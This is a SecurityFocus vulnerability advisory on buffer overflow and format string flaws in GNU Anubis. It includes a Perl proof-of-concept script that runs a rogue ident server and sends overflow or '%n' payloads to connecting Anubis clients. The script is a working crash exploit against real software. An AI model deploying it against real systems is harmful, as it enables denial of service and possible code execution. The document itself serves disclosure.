source: http://www.securityfocus.com/bid/9772/info

GNU Anubis has been reported prone to multiple buffer overflow and format string vulnerabilities. It has been conjectured that a remote attacker may potentially exploit these vulnerabilities to have arbitrary code executed in the context of the Anubis software. The buffer overflow vulnerabilities exist in the 'auth_ident' function in 'auth.c'. The format string vulnerabilities are reported to affect the 'info' function in 'log.c', the 'anubis_error' function in 'errs.c' and the 'ssl_error' function in 'ssl.c'.

These vulnerabilities have been reported to exist in GNU Anubis versions 3.6.0, 3.6.1, 3.6.2, 3.9.92, and 3.9.93. It is possible that other versions are affected as well.

These issues are undergiong further analysis, they will be divided into separate BIDs as analysis is completed.

#!/usr/bin/perl --

# anubis-crasher
# Ulf Harnhammar 2004
# I hereby place this program in the Public Domain.

use IO::Socket;


sub usage()
{
  die "usage: $0 type\n".
      "type is 'a' (buffer overflow) or 'b' (format string bug).\n";
} # sub usage


$port = 113;

usage() unless @ARGV == 1;
$type = shift;
usage() unless $type =~ m|^[ab]$|;

$send{'a'} = 'U' x 400;
$send{'b'} = '%n' x 28;
$sendstr = $send{$type};

$server = IO::Socket::INET->new(Proto => 'tcp',
                                LocalPort => $port,
                                Listen => SOMAXCONN,
                                Reuse => 1) or
          die "can't create server: $!";

while ($client = $server->accept())
{
  $client->autoflush(1);
  print "got a connection\n";

  $input = <$client>;
  $input =~ tr/\015\012//d;
  print "client said $input\n";

#  $wait = <STDIN>;
#  $wait = 'be quiet, perl -wc';

  $output = "a: USERID: a:$sendstr";
  print $client "$output\n";
  print "I said $output\n";

  close $client;
  print "disconnected\n";
} # while client=server->accept